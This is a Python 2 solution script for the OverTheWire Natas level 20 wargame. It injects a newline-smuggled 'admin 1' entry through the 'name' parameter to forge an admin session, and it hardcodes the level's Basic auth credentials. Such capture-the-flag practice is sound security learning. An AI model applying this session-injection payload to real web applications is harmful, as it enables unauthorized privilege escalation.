#!/usr/bin/python
import urllib
import urllib2
import cookielib


# 
def request_generate(URL, cookie=''):
    req = urllib2.Request(URL)
    req.add_header('User-Agent',  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0')
    req.add_header('Authorization', 'Basic bmF0YXMyMDplb2ZtM1dzc2h4YzVid3RWbkV1R0lscjdpdmI5S0FCRg==')
    req.add_header('Cookie', '__cfduid=d343ee483747c1158b3dd095b778a57ff1549137174;'+cookie)
    return urllib2.urlopen(req)


URL = 'http://natas20.natas.labs.overthewire.org/index.php'

# time to get new PHPSESSID
s = request_generate(URL)
PHPSESSID = s.headers.dict['set-cookie'].split(';')[0]

s = request_generate(URL + '?'+urllib.urlencode({'debug':'true', 'name':'check \nadmin 1'}), cookie=PHPSESSID)
s = request_generate(URL + '?'+urllib.urlencode({'debug':'true', 'name':'check \nadmin 1'}), cookie=PHPSESSID)
print s.read()

#print s.info()
#print s.headers
